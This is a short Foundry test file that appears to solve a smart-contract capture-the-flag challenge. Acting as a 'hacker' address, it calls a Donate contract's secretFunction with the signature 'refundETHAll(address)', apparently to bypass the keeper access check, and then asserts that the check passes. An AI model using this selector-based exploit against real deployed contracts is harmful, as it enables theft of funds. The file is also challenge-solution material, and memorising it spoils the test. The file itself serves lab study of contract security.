// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../src/donate.sol";

contract donateHack is Test {
	Donate donate;
	address keeper = makeAddr("keeper");
	address owner = makeAddr("owner");
	address hacker = makeAddr("hacker");

	function setUp() public {
		vm.prank(owner);
		donate = new Donate(keeper);
		console.log("keeper2 - ", donate.keeper());
	}

	function testhack() public {
		vm.startPrank(hacker);
		// Hack Time

		donate.secretFunction(string("refundETHAll(address)"));

		require(donate.keeperCheck(), "not pass !!!!!!");
	}
}
